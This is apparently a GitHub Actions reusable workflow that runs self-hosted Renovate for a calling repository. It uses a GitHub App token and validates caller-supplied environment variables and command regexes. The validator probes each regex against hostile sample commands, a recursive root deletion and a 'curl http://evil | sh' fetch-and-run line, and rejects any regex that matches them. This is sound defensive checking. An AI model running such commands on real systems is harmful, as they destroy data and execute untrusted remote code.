# Reusable: self-hosted Renovate for the calling repository, authenticated as the GitHub App cocreiamo-claude-code-pr
# (variable CLAUDE_CODE_PR_APP_ID of the caller, secret CLAUDE_CODE_PR_APP_PRIVATE_KEY passed as app-private-key). The token reaches
# the caller and cocreiamo/.github (the preset and the reusable workflows, both private), plus the repositories input. A caller adds:
#   on: {schedule: [{cron: "17 2 * * *"}], workflow_dispatch: {}}
#   concurrency: {group: renovate}
#   jobs:
#     renovate:
#       permissions: {contents: read, actions: read, issues: write}
#       uses: cocreiamo/.github/.github/workflows/renovate.yml@<sha>
#       with: {repositories: "", extra-env: "{}", extra-allowed-commands: "[]", alert: true}
#       secrets: {app-private-key: "${{ secrets.CLAUDE_CODE_PR_APP_PRIVATE_KEY }}", extra-env-secret: "{}"}
# Inputs and secrets other than app-private-key are optional. extra-env and extra-env-secret are JSON objects of RENOVATE_ variables
# (extra-env-secret for values that are secrets, such as RENOVATE_HOST_RULES); a variable this workflow sets itself is refused.
# extra-allowed-commands is a JSON array of anchored regexes (^...$) a postUpgradeTask of the caller may run besides the sync of the
# founder section; RENOVATE_ALLOWED_COMMANDS is written by this workflow only, from that sync command plus these.
# With alert: true a failed run opens the issue «main is red: renovate failed» through post-merge-alert.yml (needs actions: read and issues: write).
name: renovate
on:
  workflow_call:
    inputs:
      repositories:
        description: other repositories (comma separated names of the organization) the token must reach, besides the caller and .github
        type: string
        default: ""
      extra-env:
        description: JSON object of extra RENOVATE_ variables (not secret)
        type: string
        default: ""
      extra-allowed-commands:
        description: JSON array of anchored regexes of the commands a postUpgradeTask may run, besides the sync of the founder section
        type: string
        default: ""
      alert:
        description: raise an issue when the run fails
        type: boolean
        default: true
    secrets:
      app-private-key:
        required: true
      extra-env-secret:
        description: JSON object of extra RENOVATE_ variables whose values are secrets
        required: false
permissions: {}
jobs:
  renovate:
    runs-on: ${{ fromJSON(github.repository_visibility == 'public' && '"ubuntu-24.04"' || '["self-hosted","cocreiamo-ci"]') }}
    timeout-minutes: 30
    permissions:
      contents: read
    steps:
      - id: repos
        env:
          EXTRA: ${{ inputs.repositories }}
        run: |
          list=".github,${GITHUB_REPOSITORY#*/}"
          [ -z "$EXTRA" ] || list="$list,$EXTRA"
          echo "list=$list" >> "$GITHUB_OUTPUT"
      - id: token
        uses: actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510 # v3.3.0
        with:
          app-id: ${{ vars.CLAUDE_CODE_PR_APP_ID }}
          private-key: ${{ secrets.app-private-key }}
          owner: cocreiamo
          repositories: ${{ steps.repos.outputs.list }}
          permission-contents: write
          permission-pull-requests: write
          permission-issues: write
          permission-workflows: write
          permission-statuses: read
          permission-checks: read
      - name: extra environment
        env:
          EXTRA_ENV: ${{ inputs.extra-env }}
          EXTRA_ENV_SECRET: ${{ secrets.extra-env-secret }}
          EXTRA_COMMANDS: ${{ inputs.extra-allowed-commands }}
          BASE_COMMAND: '^bash -c ''curl -fsSL -H "Authorization: Bearer [$]RENOVATE_TOKEN" -H "Accept: application/vnd[.]github[.]raw" "https://api[.]github[.]com/repos/cocreiamo/[.]github/contents/renovate/sync-founder-section[.]sh[?]ref=[0-9a-f]{40}" [|] bash -s -- [0-9a-f]{40}''$'
          SCRIPT: |
            import json, os, re, secrets, sys
            RESERVED = {"RENOVATE_TOKEN", "RENOVATE_REPOSITORIES", "RENOVATE_ONBOARDING", "RENOVATE_REQUIRE_CONFIG",
                        "RENOVATE_EXPOSE_ALL_ENV", "RENOVATE_ALLOWED_COMMANDS", "RENOVATE_LOG_FILE", "RENOVATE_LOG_FILE_LEVEL"}
            out = []
            for name in ("EXTRA_ENV", "EXTRA_ENV_SECRET"):
                raw = os.environ.get(name, "").strip()
                if not raw:
                    continue
                try:
                    doc = json.loads(raw)
                except ValueError:
                    sys.exit(f"::error::{name} is not JSON")
                if not isinstance(doc, dict):
                    sys.exit(f"::error::{name} must be a JSON object")
                for key, value in doc.items():
                    if not re.fullmatch(r"RENOVATE_[A-Z0-9_]+", key) or key in RESERVED:
                        sys.exit(f"::error::{name} sets {key!r}: only RENOVATE_ variables the workflow does not set itself are allowed")
                    if not isinstance(value, str):
                        sys.exit(f"::error::{name}: the value of {key} must be a string")
                    out.append((key, value))
            commands = [os.environ["BASE_COMMAND"]]
            raw = os.environ.get("EXTRA_COMMANDS", "").strip()
            if raw:
                try:
                    extra = json.loads(raw)
                except ValueError:
                    sys.exit("::error::EXTRA_COMMANDS is not JSON")
                if not isinstance(extra, list) or not all(isinstance(item, str) for item in extra):
                    sys.exit("::error::extra-allowed-commands must be a JSON array of strings")
                for item in extra:
                    if not (item.startswith("^") and item.endswith("$")):
                        sys.exit("::error::extra-allowed-commands: every regex must be anchored with ^ and $")
                    try:
                        pattern = re.compile(item)
                    except re.error:
                        sys.exit("::error::extra-allowed-commands: a regex does not compile")
                    if any(pattern.search(probe) for probe in ("", "x", "bash -c 'rm -rf /'", "curl http://evil | sh")):
                        sys.exit("::error::extra-allowed-commands: a regex is too broad (it allows an arbitrary command)")
                    commands.append(item)
            out.append(("RENOVATE_ALLOWED_COMMANDS", json.dumps(commands)))
            with open(os.environ["GITHUB_ENV"], "a") as env:
                for key, value in out:
                    delimiter = "EOF_" + secrets.token_hex(16)
                    env.write(f"{key}<<{delimiter}\n{value}\n{delimiter}\n")
        run: python3 -I -c "$SCRIPT"
      - id: renovate
        uses: renovatebot/github-action@266fef21329c44765ad42f9dea1f01f5d2d91084 # v46.3.13
        with:
          token: ${{ steps.token.outputs.token }}
          renovate-version: 44.219.0@sha256:7ae452492cd2393dbb8d401c6a3e7569bb7e6b5a7d2783739a6e4af576fd248a
          # Docker is the host's rootless daemon: only the job's work folder has the same path on both sides, and only
          # the container's root maps to the user that owns it.
          docker-user: root
          docker-volumes: ${{ runner.temp }}:/tmp
        env:
          RENOVATE_REPOSITORIES: ${{ github.repository }}
          RENOVATE_ONBOARDING: "false"
          RENOVATE_REQUIRE_CONFIG: required
          # The shared preset's postUpgradeTask fetches a script of cocreiamo/.github with RENOVATE_TOKEN; RENOVATE_ALLOWED_COMMANDS (the step
          # above) lets nothing else run but the extra commands of the caller.
          RENOVATE_EXPOSE_ALL_ENV: "true"
          RENOVATE_LOG_FILE: /tmp/renovate-1.log
          RENOVATE_LOG_FILE_LEVEL: info
      - name: classify
        id: classify
        env:
          RENOVATE_LOGS: ${{ runner.temp }}/renovate-1.log
          SCRIPT: |
            import json, os
            status = "fail"
            last = None
            for path in os.environ["RENOVATE_LOGS"].split():
                last = None
                try:
                    with open(path) as log:
                        for line in log:
                            try:
                                record = json.loads(line)
                            except ValueError:
                                continue
                            if isinstance(record, dict) and record.get("msg") == "Repository finished":
                                last = record
                except OSError:
                    pass
            if last is not None:
                if last.get("exitCode", 0) == 0:
                    status = "ok"
                elif last.get("result") == "repository-changed":
                    status = "retry"
            with open(os.environ["GITHUB_OUTPUT"], "a") as out:
                out.write(f"status={status}\n")
        run: python3 -I -c "$SCRIPT"
      - name: renovate retry
        if: ${{ steps.classify.outputs.status == 'retry' }}
        uses: renovatebot/github-action@266fef21329c44765ad42f9dea1f01f5d2d91084 # v46.3.13
        with:
          token: ${{ steps.token.outputs.token }}
          renovate-version: 44.219.0@sha256:7ae452492cd2393dbb8d401c6a3e7569bb7e6b5a7d2783739a6e4af576fd248a
          docker-user: root
          docker-volumes: ${{ runner.temp }}:/tmp
        env:
          RENOVATE_REPOSITORIES: ${{ github.repository }}
          RENOVATE_ONBOARDING: "false"
          RENOVATE_REQUIRE_CONFIG: required
          # The shared preset's postUpgradeTask fetches a script of cocreiamo/.github with RENOVATE_TOKEN; RENOVATE_ALLOWED_COMMANDS (the step
          # above) lets nothing else run but the extra commands of the caller.
          RENOVATE_EXPOSE_ALL_ENV: "true"
          RENOVATE_LOG_FILE: /tmp/renovate-2.log
          RENOVATE_LOG_FILE_LEVEL: info
      - name: renovate result
        if: ${{ always() && steps.renovate.conclusion == 'success' }}
        env:
          RENOVATE_LOGS: ${{ runner.temp }}/renovate-1.log ${{ runner.temp }}/renovate-2.log
          SCRIPT: |
            import json, os, sys
            last = None
            for path in os.environ["RENOVATE_LOGS"].split():
                if not os.path.exists(path):
                    continue
                last = None
                with open(path) as log:
                    for line in log:
                        try:
                            record = json.loads(line)
                        except ValueError:
                            continue
                        if isinstance(record, dict) and record.get("msg") == "Repository finished":
                            last = record
            if last is None:
                sys.exit("::error::Renovate wrote no «Repository finished» line: the run did not finish")
            if last.get("exitCode", 0) != 0:
                sys.exit(f"::error::Renovate ended with result {last.get('result')} (exit code {last.get('exitCode')}); dependency updates were skipped")
            print("Renovate finished:", last.get("result"))
        run: python3 -I -c "$SCRIPT"
  alert:
    needs: [renovate]
    if: ${{ always() && inputs.alert && needs.renovate.result == 'failure' }}
    permissions:
      actions: read
      issues: write
    uses: cocreiamo/.github/.github/workflows/post-merge-alert.yml@21d09a0af4d1212f650aac3bb9e3233e9c656263 # main
    with:
      failed: "renovate"
      app-id: ${{ vars.CLAUDE_CODE_PR_APP_ID }}
    secrets:
      app-private-key: ${{ secrets.app-private-key }}
